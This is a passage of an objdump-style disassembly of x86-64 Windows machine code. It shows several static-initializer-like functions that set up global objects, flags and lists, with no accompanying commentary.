   140001741:	48 8d 15 f8 4b 08 00 	lea    0x84bf8(%rip),%rdx        # 0x140086340
   140001748:	48 8d 0d e1 4b 08 00 	lea    0x84be1(%rip),%rcx        # 0x140086330
   14000174f:	e8 fc f9 01 00       	call   0x140021150
   140001754:	44 8b 05 dd 4b 08 00 	mov    0x84bdd(%rip),%r8d        # 0x140086338
   14000175b:	48 8b 0d ce 4b 08 00 	mov    0x84bce(%rip),%rcx        # 0x140086330
   140001762:	41 8b c0             	mov    %r8d,%eax
   140001765:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140001769:	ff 05 c9 4b 08 00    	incl   0x84bc9(%rip)        # 0x140086338
   14000176f:	4c 8b c7             	mov    %rdi,%r8
   140001772:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001777:	48 8d 0d ca 4b 08 00 	lea    0x84bca(%rip),%rcx        # 0x140086348
   14000177e:	e8 dd 3f 02 00       	call   0x140025760
   140001783:	48 8b 05 a6 47 08 00 	mov    0x847a6(%rip),%rax        # 0x140085f30
   14000178a:	90                   	nop
   14000178b:	48 85 c0             	test   %rax,%rax
   14000178e:	75 1a                	jne    0x1400017aa
   140001790:	4c 8d 05 a9 37 02 00 	lea    0x237a9(%rip),%r8        # 0x140024f40
   140001797:	48 8d 15 d2 35 02 00 	lea    0x235d2(%rip),%rdx        # 0x140024d70
   14000179e:	48 8d 0d 8b 47 08 00 	lea    0x8478b(%rip),%rcx        # 0x140085f30
   1400017a5:	e8 46 44 03 00       	call   0x140035bf0
   1400017aa:	48 8b 0d 7f 47 08 00 	mov    0x8477f(%rip),%rcx        # 0x140085f30
   1400017b1:	45 33 c0             	xor    %r8d,%r8d
   1400017b4:	48 8d 15 35 4b 08 00 	lea    0x84b35(%rip),%rdx        # 0x1400862f0
   1400017bb:	e8 20 34 02 00       	call   0x140024be0
   1400017c0:	66 09 35 33 4b 08 00 	or     %si,0x84b33(%rip)        # 0x1400862fa
   1400017c7:	48 8d 0d e2 17 06 00 	lea    0x617e2(%rip),%rcx        # 0x140062fb0
   1400017ce:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400017d5:	00 
   1400017d6:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400017da:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400017de:	49 8b e3             	mov    %r11,%rsp
   1400017e1:	5f                   	pop    %rdi
   1400017e2:	e9 49 b0 03 00       	jmp    0x14003c830
   1400017e7:	cc                   	int3
   1400017e8:	cc                   	int3
   1400017e9:	cc                   	int3
   1400017ea:	cc                   	int3
   1400017eb:	cc                   	int3
   1400017ec:	cc                   	int3
   1400017ed:	cc                   	int3
   1400017ee:	cc                   	int3
   1400017ef:	cc                   	int3
   1400017f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400017fa:	57                   	push   %rdi
   1400017fb:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001802:	48 8d 05 c7 5a 06 00 	lea    0x65ac7(%rip),%rax        # 0x1400672d0
   140001809:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000180e:	48 c7 44 24 38 3f 00 	movq   $0x3f,0x38(%rsp)
   140001815:	00 00 
   140001817:	48 8b 05 fa 46 08 00 	mov    0x846fa(%rip),%rax        # 0x140085f18
   14000181e:	90                   	nop
   14000181f:	48 85 c0             	test   %rax,%rax
   140001822:	75 1a                	jne    0x14000183e
   140001824:	4c 8d 05 15 38 02 00 	lea    0x23815(%rip),%r8        # 0x140025040
   14000182b:	48 8d 15 6e 36 02 00 	lea    0x2366e(%rip),%rdx        # 0x140024ea0
   140001832:	48 8d 0d df 46 08 00 	lea    0x846df(%rip),%rcx        # 0x140085f18
   140001839:	e8 b2 43 03 00       	call   0x140035bf0
   14000183e:	48 8b 3d d3 46 08 00 	mov    0x846d3(%rip),%rdi        # 0x140085f18
   140001845:	45 33 c0             	xor    %r8d,%r8d
   140001848:	33 d2                	xor    %edx,%edx
   14000184a:	48 8d 0d 5f 49 08 00 	lea    0x8495f(%rip),%rcx        # 0x1400861b0
   140001851:	e8 6a 1d 02 00       	call   0x1400235c0
   140001856:	90                   	nop
   140001857:	33 db                	xor    %ebx,%ebx
   140001859:	8b cb                	mov    %ebx,%ecx
   14000185b:	48 89 1d ce 49 08 00 	mov    %rbx,0x849ce(%rip)        # 0x140086230
   140001862:	48 8d 05 ff 59 06 00 	lea    0x659ff(%rip),%rax        # 0x140067268
   140001869:	48 89 05 c8 49 08 00 	mov    %rax,0x849c8(%rip)        # 0x140086238
   140001870:	48 8d 05 09 5a 06 00 	lea    0x65a09(%rip),%rax        # 0x140067280
   140001877:	48 89 05 32 49 08 00 	mov    %rax,0x84932(%rip)        # 0x1400861b0
   14000187e:	48 8d 05 83 59 06 00 	lea    0x65983(%rip),%rax        # 0x140067208
   140001885:	48 89 05 b4 49 08 00 	mov    %rax,0x849b4(%rip)        # 0x140086240
   14000188c:	48 8d 05 7d 5a 06 00 	lea    0x65a7d(%rip),%rax        # 0x140067310
   140001893:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001898:	48 c7 44 24 28 09 00 	movq   $0x9,0x28(%rsp)
   14000189f:	00 00 
   1400018a1:	0f b7 05 12 49 08 00 	movzwl 0x84912(%rip),%eax        # 0x1400861ba
   1400018a8:	be 00 40 00 00       	mov    $0x4000,%esi
   1400018ad:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400018b2:	66 85 c6             	test   %ax,%si
   1400018b5:	74 58                	je     0x14000190f
   1400018b7:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   1400018bd:	48 8b 05 6c 46 08 00 	mov    0x8466c(%rip),%rax        # 0x140085f30
   1400018c4:	90                   	nop
   1400018c5:	48 85 c0             	test   %rax,%rax
   1400018c8:	75 1a                	jne    0x1400018e4
   1400018ca:	4c 8d 05 6f 36 02 00 	lea    0x2366f(%rip),%r8        # 0x140024f40
   1400018d1:	48 8d 15 98 34 02 00 	lea    0x23498(%rip),%rdx        # 0x140024d70
   1400018d8:	48 8d 0d 51 46 08 00 	lea    0x84651(%rip),%rcx        # 0x140085f30
   1400018df:	e8 0c 43 03 00       	call   0x140035bf0
   1400018e4:	48 8b 0d 45 46 08 00 	mov    0x84645(%rip),%rcx        # 0x140085f30
   1400018eb:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400018f0:	48 8d 15 b9 48 08 00 	lea    0x848b9(%rip),%rdx        # 0x1400861b0
   1400018f7:	e8 84 69 02 00       	call   0x140028280
   1400018fc:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001901:	48 8b 0d 28 49 08 00 	mov    0x84928(%rip),%rcx        # 0x140086230
   140001908:	0f b7 05 ab 48 08 00 	movzwl 0x848ab(%rip),%eax        # 0x1400861ba
   14000190f:	0f 29 05 aa 48 08 00 	movaps %xmm0,0x848aa(%rip)        # 0x1400861c0
   140001916:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   14000191b:	0f 29 05 ae 48 08 00 	movaps %xmm0,0x848ae(%rip)        # 0x1400861d0
   140001922:	48 85 c9             	test   %rcx,%rcx
   140001925:	74 47                	je     0x14000196e
   140001927:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   14000192e:	00 03 01 
   140001931:	48 8d 05 00 58 06 00 	lea    0x65800(%rip),%rax        # 0x140067138
   140001938:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000193d:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001942:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001947:	e8 b4 4d 03 00       	call   0x140036700
   14000194c:	4c 8b c8             	mov    %rax,%r9
   14000194f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001954:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001959:	48 8d 0d 50 48 08 00 	lea    0x84850(%rip),%rcx        # 0x1400861b0
   140001960:	e8 0b 3a 02 00       	call   0x140025370
   140001965:	0f b7 05 4e 48 08 00 	movzwl 0x8484e(%rip),%eax        # 0x1400861ba
   14000196c:	eb 0e                	jmp    0x14000197c
   14000196e:	48 8d 0d eb 27 08 00 	lea    0x827eb(%rip),%rcx        # 0x140084160
   140001975:	48 89 0d b4 48 08 00 	mov    %rcx,0x848b4(%rip)        # 0x140086230
   14000197c:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   140001981:	66 23 c1             	and    %cx,%ax
   140001984:	66 83 c8 38          	or     $0x38,%ax
   140001988:	66 89 05 2b 48 08 00 	mov    %ax,0x8482b(%rip)        # 0x1400861ba
   14000198f:	48 8d 05 1a 47 08 00 	lea    0x8471a(%rip),%rax        # 0x1400860b0
   140001996:	48 8b 0d 53 48 08 00 	mov    0x84853(%rip),%rcx        # 0x1400861f0
   14000199d:	48 8d 1d b4 45 08 00 	lea    0x845b4(%rip),%rbx        # 0x140085f58
   1400019a4:	48 39 01             	cmp    %rax,(%rcx)
   1400019a7:	75 05                	jne    0x1400019ae
   1400019a9:	48 89 19             	mov    %rbx,(%rcx)
   1400019ac:	eb 61                	jmp    0x140001a0f
   1400019ae:	44 8b 05 43 48 08 00 	mov    0x84843(%rip),%r8d        # 0x1400861f8
   1400019b5:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   1400019b9:	48 8b c1             	mov    %rcx,%rax
   1400019bc:	48 3b ca             	cmp    %rdx,%rcx
   1400019bf:	74 0e                	je     0x1400019cf
   1400019c1:	48 39 18             	cmp    %rbx,(%rax)
   1400019c4:	74 49                	je     0x140001a0f
   1400019c6:	48 83 c0 08          	add    $0x8,%rax
   1400019ca:	48 3b c2             	cmp    %rdx,%rax
   1400019cd:	75 f2                	jne    0x1400019c1
   1400019cf:	44 3b 05 26 48 08 00 	cmp    0x84826(%rip),%r8d        # 0x1400861fc
   1400019d6:	72 2a                	jb     0x140001a02
   1400019d8:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400019de:	45 33 c0             	xor    %r8d,%r8d
   1400019e1:	48 8d 15 18 48 08 00 	lea    0x84818(%rip),%rdx        # 0x140086200
   1400019e8:	48 8d 0d 01 48 08 00 	lea    0x84801(%rip),%rcx        # 0x1400861f0
   1400019ef:	e8 5c f7 01 00       	call   0x140021150
   1400019f4:	44 8b 05 fd 47 08 00 	mov    0x847fd(%rip),%r8d        # 0x1400861f8
   1400019fb:	48 8b 0d ee 47 08 00 	mov    0x847ee(%rip),%rcx        # 0x1400861f0
   140001a02:	41 8b c0             	mov    %r8d,%eax
   140001a05:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140001a09:	ff 05 e9 47 08 00    	incl   0x847e9(%rip)        # 0x1400861f8
   140001a0f:	4c 8b c7             	mov    %rdi,%r8
   140001a12:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001a17:	48 8d 0d ea 47 08 00 	lea    0x847ea(%rip),%rcx        # 0x140086208
   140001a1e:	e8 3d 3d 02 00       	call   0x140025760
   140001a23:	48 8b 05 06 45 08 00 	mov    0x84506(%rip),%rax        # 0x140085f30
   140001a2a:	90                   	nop
   140001a2b:	48 85 c0             	test   %rax,%rax
   140001a2e:	75 1a                	jne    0x140001a4a
   140001a30:	4c 8d 05 09 35 02 00 	lea    0x23509(%rip),%r8        # 0x140024f40
   140001a37:	48 8d 15 32 33 02 00 	lea    0x23332(%rip),%rdx        # 0x140024d70
   140001a3e:	48 8d 0d eb 44 08 00 	lea    0x844eb(%rip),%rcx        # 0x140085f30
   140001a45:	e8 a6 41 03 00       	call   0x140035bf0
   140001a4a:	48 8b 0d df 44 08 00 	mov    0x844df(%rip),%rcx        # 0x140085f30
   140001a51:	45 33 c0             	xor    %r8d,%r8d
   140001a54:	48 8d 15 55 47 08 00 	lea    0x84755(%rip),%rdx        # 0x1400861b0
   140001a5b:	e8 80 31 02 00       	call   0x140024be0
   140001a60:	66 09 35 53 47 08 00 	or     %si,0x84753(%rip)        # 0x1400861ba
   140001a67:	48 8d 0d 92 15 06 00 	lea    0x61592(%rip),%rcx        # 0x140063000
   140001a6e:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001a75:	00 
   140001a76:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140001a7a:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140001a7e:	49 8b e3             	mov    %r11,%rsp
   140001a81:	5f                   	pop    %rdi
   140001a82:	e9 a9 ad 03 00       	jmp    0x14003c830
   140001a87:	cc                   	int3
   140001a88:	cc                   	int3
   140001a89:	cc                   	int3
   140001a8a:	cc                   	int3
   140001a8b:	cc                   	int3
   140001a8c:	cc                   	int3
   140001a8d:	cc                   	int3
   140001a8e:	cc                   	int3
   140001a8f:	cc                   	int3
   140001a90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001a95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001a9a:	57                   	push   %rdi
   140001a9b:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140001aa2:	48 8d 05 27 59 06 00 	lea    0x65927(%rip),%rax        # 0x1400673d0
   140001aa9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001aae:	48 c7 44 24 38 32 00 	movq   $0x32,0x38(%rsp)
   140001ab5:	00 00 
   140001ab7:	48 8b 05 5a 44 08 00 	mov    0x8445a(%rip),%rax        # 0x140085f18
   140001abe:	90                   	nop
   140001abf:	48 85 c0             	test   %rax,%rax
   140001ac2:	75 1a                	jne    0x140001ade
   140001ac4:	4c 8d 05 75 35 02 00 	lea    0x23575(%rip),%r8        # 0x140025040
   140001acb:	48 8d 15 ce 33 02 00 	lea    0x233ce(%rip),%rdx        # 0x140024ea0
   140001ad2:	48 8d 0d 3f 44 08 00 	lea    0x8443f(%rip),%rcx        # 0x140085f18
   140001ad9:	e8 12 41 03 00       	call   0x140035bf0
   140001ade:	48 8b 3d 33 44 08 00 	mov    0x84433(%rip),%rdi        # 0x140085f18
   140001ae5:	45 33 c0             	xor    %r8d,%r8d
   140001ae8:	33 d2                	xor    %edx,%edx
   140001aea:	48 8d 0d df 45 08 00 	lea    0x845df(%rip),%rcx        # 0x1400860d0
   140001af1:	e8 ca 1a 02 00       	call   0x1400235c0
   140001af6:	90                   	nop
   140001af7:	33 db                	xor    %ebx,%ebx
   140001af9:	8b cb                	mov    %ebx,%ecx
   140001afb:	48 89 1d 4e 46 08 00 	mov    %rbx,0x8464e(%rip)        # 0x140086150
   140001b02:	48 8d 05 5f 58 06 00 	lea    0x6585f(%rip),%rax        # 0x140067368
   140001b09:	48 89 05 48 46 08 00 	mov    %rax,0x84648(%rip)        # 0x140086158
   140001b10:	48 8d 05 69 58 06 00 	lea    0x65869(%rip),%rax        # 0x140067380
   140001b17:	48 89 05 b2 45 08 00 	mov    %rax,0x845b2(%rip)        # 0x1400860d0
   140001b1e:	48 8d 05 e3 56 06 00 	lea    0x656e3(%rip),%rax        # 0x140067208
   140001b25:	48 89 05 34 46 08 00 	mov    %rax,0x84634(%rip)        # 0x140086160
   140001b2c:	48 8d 05 d1 58 06 00 	lea    0x658d1(%rip),%rax        # 0x140067404
   140001b33:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001b38:	48 c7 44 24 28 04 00 	movq   $0x4,0x28(%rsp)
   140001b3f:	00 00 
   140001b41:	0f b7 05 92 45 08 00 	movzwl 0x84592(%rip),%eax        # 0x1400860da
   140001b48:	be 00 40 00 00       	mov    $0x4000,%esi
   140001b4d:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001b52:	66 85 c6             	test   %ax,%si
   140001b55:	74 58                	je     0x140001baf
   140001b57:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   140001b5d:	48 8b 05 cc 43 08 00 	mov    0x843cc(%rip),%rax        # 0x140085f30
   140001b64:	90                   	nop
   140001b65:	48 85 c0             	test   %rax,%rax
   140001b68:	75 1a                	jne    0x140001b84
   140001b6a:	4c 8d 05 cf 33 02 00 	lea    0x233cf(%rip),%r8        # 0x140024f40
   140001b71:	48 8d 15 f8 31 02 00 	lea    0x231f8(%rip),%rdx        # 0x140024d70
   140001b78:	48 8d 0d b1 43 08 00 	lea    0x843b1(%rip),%rcx        # 0x140085f30
   140001b7f:	e8 6c 40 03 00       	call   0x140035bf0
   140001b84:	48 8b 0d a5 43 08 00 	mov    0x843a5(%rip),%rcx        # 0x140085f30
   140001b8b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001b90:	48 8d 15 39 45 08 00 	lea    0x84539(%rip),%rdx        # 0x1400860d0
   140001b97:	e8 e4 66 02 00       	call   0x140028280
   140001b9c:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001ba1:	48 8b 0d a8 45 08 00 	mov    0x845a8(%rip),%rcx        # 0x140086150
   140001ba8:	0f b7 05 2b 45 08 00 	movzwl 0x8452b(%rip),%eax        # 0x1400860da
   140001baf:	0f 29 05 2a 45 08 00 	movaps %xmm0,0x8452a(%rip)        # 0x1400860e0
   140001bb6:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   140001bbb:	0f 29 05 2e 45 08 00 	movaps %xmm0,0x8452e(%rip)        # 0x1400860f0
   140001bc2:	48 85 c9             	test   %rcx,%rcx
   140001bc5:	74 47                	je     0x140001c0e
   140001bc7:	66 c7 84 24 80 00 00 	movw   $0x103,0x80(%rsp)
   140001bce:	00 03 01 
   140001bd1:	48 8d 05 60 55 06 00 	lea    0x65560(%rip),%rax        # 0x140067138
   140001bd8:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140001bdd:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001be2:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140001be7:	e8 14 4b 03 00       	call   0x140036700
   140001bec:	4c 8b c8             	mov    %rax,%r9
   140001bef:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001bf4:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001bf9:	48 8d 0d d0 44 08 00 	lea    0x844d0(%rip),%rcx        # 0x1400860d0
   140001c00:	e8 6b 37 02 00       	call   0x140025370
   140001c05:	0f b7 05 ce 44 08 00 	movzwl 0x844ce(%rip),%eax        # 0x1400860da
   140001c0c:	eb 0e                	jmp    0x140001c1c
   140001c0e:	48 8d 0d 8b 25 08 00 	lea    0x8258b(%rip),%rcx        # 0x1400841a0
   140001c15:	48 89 0d 34 45 08 00 	mov    %rcx,0x84534(%rip)        # 0x140086150
   140001c1c:	66 83 c8 18          	or     $0x18,%ax
   140001c20:	66 89 05 b3 44 08 00 	mov    %ax,0x844b3(%rip)        # 0x1400860da
   140001c27:	48 8d 05 82 44 08 00 	lea    0x84482(%rip),%rax        # 0x1400860b0
   140001c2e:	48 8b 0d db 44 08 00 	mov    0x844db(%rip),%rcx        # 0x140086110
   140001c35:	48 8d 1d 1c 43 08 00 	lea    0x8431c(%rip),%rbx        # 0x140085f58
   140001c3c:	48 39 01             	cmp    %rax,(%rcx)
   140001c3f:	75 05                	jne    0x140001c46
   140001c41:	48 89 19             	mov    %rbx,(%rcx)
   140001c44:	eb 68                	jmp    0x140001cae
   140001c46:	44 8b 05 cb 44 08 00 	mov    0x844cb(%rip),%r8d        # 0x140086118
   140001c4d:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140001c51:	48 8b c1             	mov    %rcx,%rax
   140001c54:	48 3b ca             	cmp    %rdx,%rcx
   140001c57:	74 15                	je     0x140001c6e
   140001c59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001c60:	48 39 18             	cmp    %rbx,(%rax)
   140001c63:	74 49                	je     0x140001cae
   140001c65:	48 83 c0 08          	add    $0x8,%rax
   140001c69:	48 3b c2             	cmp    %rdx,%rax
   140001c6c:	75 f2                	jne    0x140001c60
   140001c6e:	44 3b 05 a7 44 08 00 	cmp    0x844a7(%rip),%r8d        # 0x14008611c
   140001c75:	72 2a                	jb     0x140001ca1
   140001c77:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140001c7d:	45 33 c0             	xor    %r8d,%r8d
   140001c80:	48 8d 15 99 44 08 00 	lea    0x84499(%rip),%rdx        # 0x140086120
   140001c87:	48 8d 0d 82 44 08 00 	lea    0x84482(%rip),%rcx        # 0x140086110
   140001c8e:	e8 bd f4 01 00       	call   0x140021150
   140001c93:	44 8b 05 7e 44 08 00 	mov    0x8447e(%rip),%r8d        # 0x140086118
   140001c9a:	48 8b 0d 6f 44 08 00 	mov    0x8446f(%rip),%rcx        # 0x140086110
   140001ca1:	41 8b c0             	mov    %r8d,%eax
   140001ca4:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140001ca8:	ff 05 6a 44 08 00    	incl   0x8446a(%rip)        # 0x140086118
   140001cae:	4c 8b c7             	mov    %rdi,%r8
   140001cb1:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001cb6:	48 8d 0d 6b 44 08 00 	lea    0x8446b(%rip),%rcx        # 0x140086128
   140001cbd:	e8 9e 3a 02 00       	call   0x140025760
   140001cc2:	48 8b 05 67 42 08 00 	mov    0x84267(%rip),%rax        # 0x140085f30
   140001cc9:	90                   	nop
   140001cca:	48 85 c0             	test   %rax,%rax
   140001ccd:	75 1a                	jne    0x140001ce9
   140001ccf:	4c 8d 05 6a 32 02 00 	lea    0x2326a(%rip),%r8        # 0x140024f40
   140001cd6:	48 8d 15 93 30 02 00 	lea    0x23093(%rip),%rdx        # 0x140024d70
   140001cdd:	48 8d 0d 4c 42 08 00 	lea    0x8424c(%rip),%rcx        # 0x140085f30
   140001ce4:	e8 07 3f 03 00       	call   0x140035bf0
   140001ce9:	48 8b 0d 40 42 08 00 	mov    0x84240(%rip),%rcx        # 0x140085f30
   140001cf0:	45 33 c0             	xor    %r8d,%r8d
   140001cf3:	48 8d 15 d6 43 08 00 	lea    0x843d6(%rip),%rdx        # 0x1400860d0
   140001cfa:	e8 e1 2e 02 00       	call   0x140024be0
   140001cff:	66 09 35 d4 43 08 00 	or     %si,0x843d4(%rip)        # 0x1400860da
   140001d06:	48 8d 0d 43 13 06 00 	lea    0x61343(%rip),%rcx        # 0x140063050
   140001d0d:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140001d14:	00 
   140001d15:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140001d19:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140001d1d:	49 8b e3             	mov    %r11,%rsp
   140001d20:	5f                   	pop    %rdi
   140001d21:	e9 0a ab 03 00       	jmp    0x14003c830
   140001d26:	cc                   	int3
   140001d27:	cc                   	int3
   140001d28:	cc                   	int3
   140001d29:	cc                   	int3
   140001d2a:	cc                   	int3
   140001d2b:	cc                   	int3
   140001d2c:	cc                   	int3
   140001d2d:	cc                   	int3
   140001d2e:	cc                   	int3
   140001d2f:	cc                   	int3
   140001d30:	48 83 ec 68          	sub    $0x68,%rsp
   140001d34:	48 8d 05 d5 56 06 00 	lea    0x656d5(%rip),%rax        # 0x140067410
   140001d3b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d40:	48 c7 44 24 48 10 00 	movq   $0x10,0x48(%rsp)
   140001d47:	00 00 
   140001d49:	33 d2                	xor    %edx,%edx
   140001d4b:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140001d4f:	48 8d 0d 2a 42 08 00 	lea    0x8422a(%rip),%rcx        # 0x140085f80
   140001d56:	e8 65 18 02 00       	call   0x1400235c0
   140001d5b:	90                   	nop
   140001d5c:	48 8d 05 a5 58 06 00 	lea    0x658a5(%rip),%rax        # 0x140067608
   140001d63:	48 89 05 16 42 08 00 	mov    %rax,0x84216(%rip)        # 0x140085f80
   140001d6a:	33 c9                	xor    %ecx,%ecx
   140001d6c:	48 89 0d 8d 42 08 00 	mov    %rcx,0x8428d(%rip)        # 0x140086000
   140001d73:	48 8d 05 aa 56 06 00 	lea    0x656aa(%rip),%rax        # 0x140067424
   140001d7a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001d7f:	48 c7 44 24 28 01 00 	movq   $0x1,0x28(%rsp)
   140001d86:	00 00 
   140001d88:	0f b7 05 fb 41 08 00 	movzwl 0x841fb(%rip),%eax        # 0x140085f8a
   140001d8f:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001d94:	66 0f ba e0 0e       	bt     $0xe,%ax
   140001d99:	73 58                	jae    0x140001df3
   140001d9b:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   140001da1:	48 8b 05 88 41 08 00 	mov    0x84188(%rip),%rax        # 0x140085f30
   140001da8:	90                   	nop
   140001da9:	48 85 c0             	test   %rax,%rax
   140001dac:	75 1a                	jne    0x140001dc8
   140001dae:	4c 8d 05 8b 31 02 00 	lea    0x2318b(%rip),%r8        # 0x140024f40
   140001db5:	48 8d 15 b4 2f 02 00 	lea    0x22fb4(%rip),%rdx        # 0x140024d70
   140001dbc:	48 8d 0d 6d 41 08 00 	lea    0x8416d(%rip),%rcx        # 0x140085f30
   140001dc3:	e8 28 3e 03 00       	call   0x140035bf0
   140001dc8:	48 8b 0d 61 41 08 00 	mov    0x84161(%rip),%rcx        # 0x140085f30
   140001dcf:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140001dd4:	48 8d 15 a5 41 08 00 	lea    0x841a5(%rip),%rdx        # 0x140085f80
   140001ddb:	e8 a0 64 02 00       	call   0x140028280
   140001de0:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001de5:	48 8b 0d 14 42 08 00 	mov    0x84214(%rip),%rcx        # 0x140086000
   140001dec:	0f b7 05 97 41 08 00 	movzwl 0x84197(%rip),%eax        # 0x140085f8a
   140001df3:	0f 29 05 96 41 08 00 	movaps %xmm0,0x84196(%rip)        # 0x140085f90
   140001dfa:	ba 00 10 00 00       	mov    $0x1000,%edx
   140001dff:	66 0b c2             	or     %dx,%ax
   140001e02:	66 89 05 81 41 08 00 	mov    %ax,0x84181(%rip)        # 0x140085f8a
   140001e09:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140001e0e:	0f 29 05 8b 41 08 00 	movaps %xmm0,0x8418b(%rip)        # 0x140085fa0
   140001e15:	48 85 c9             	test   %rcx,%rcx
   140001e18:	74 4a                	je     0x140001e64
   140001e1a:	66 c7 44 24 30 03 01 	movw   $0x103,0x30(%rsp)
   140001e21:	48 8d 05 e8 58 06 00 	lea    0x658e8(%rip),%rax        # 0x140067710
   140001e28:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001e2d:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140001e34:	00 00 
   140001e36:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   140001e3d:	00 00 
   140001e3f:	e8 bc 48 03 00       	call   0x140036700
   140001e44:	4c 8b c8             	mov    %rax,%r9
   140001e47:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001e4c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001e51:	48 8d 0d 28 41 08 00 	lea    0x84128(%rip),%rcx        # 0x140085f80
   140001e58:	e8 13 35 02 00       	call   0x140025370
   140001e5d:	0f b7 05 26 41 08 00 	movzwl 0x84126(%rip),%eax        # 0x140085f8a
   140001e64:	48 8d 15 65 42 08 00 	lea    0x84265(%rip),%rdx        # 0x1400860d0
   140001e6b:	48 89 15 8e 41 08 00 	mov    %rdx,0x8418e(%rip)        # 0x140086000
   140001e72:	ba 00 20 00 00       	mov    $0x2000,%edx
   140001e77:	66 0b c2             	or     %dx,%ax
   140001e7a:	66 89 05 09 41 08 00 	mov    %ax,0x84109(%rip)        # 0x140085f8a
   140001e81:	48 8d 0d f8 40 08 00 	lea    0x840f8(%rip),%rcx        # 0x140085f80
   140001e88:	e8 b3 32 02 00       	call   0x140025140
   140001e8d:	90                   	nop
   140001e8e:	48 8d 0d 0b 12 06 00 	lea    0x6120b(%rip),%rcx        # 0x1400630a0
   140001e95:	48 83 c4 68          	add    $0x68,%rsp
   140001e99:	e9 92 a9 03 00       	jmp    0x14003c830
   140001e9e:	cc                   	int3
   140001e9f:	cc                   	int3
   140001ea0:	48 8b 0d b1 22 08 00 	mov    0x822b1(%rip),%rcx        # 0x140084158
   140001ea7:	48 03 0d 7a 22 08 00 	add    0x8227a(%rip),%rcx        # 0x140084128
   140001eae:	48 89 0d c3 40 08 00 	mov    %rcx,0x840c3(%rip)        # 0x140085f78
   140001eb5:	c3                   	ret
   140001eb6:	cc                   	int3
   140001eb7:	cc                   	int3
   140001eb8:	cc                   	int3
   140001eb9:	cc                   	int3
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	48 8d 0d 19 12 06 00 	lea    0x61219(%rip),%rcx        # 0x1400630e0
   140001ec7:	e9 64 a9 03 00       	jmp    0x14003c830
   140001ecc:	cc                   	int3
   140001ecd:	cc                   	int3
   140001ece:	cc                   	int3
   140001ecf:	cc                   	int3
   140001ed0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001ed5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001eda:	57                   	push   %rdi
   140001edb:	48 83 ec 60          	sub    $0x60,%rsp
   140001edf:	48 8d 05 ba 55 06 00 	lea    0x655ba(%rip),%rax        # 0x1400674a0
   140001ee6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
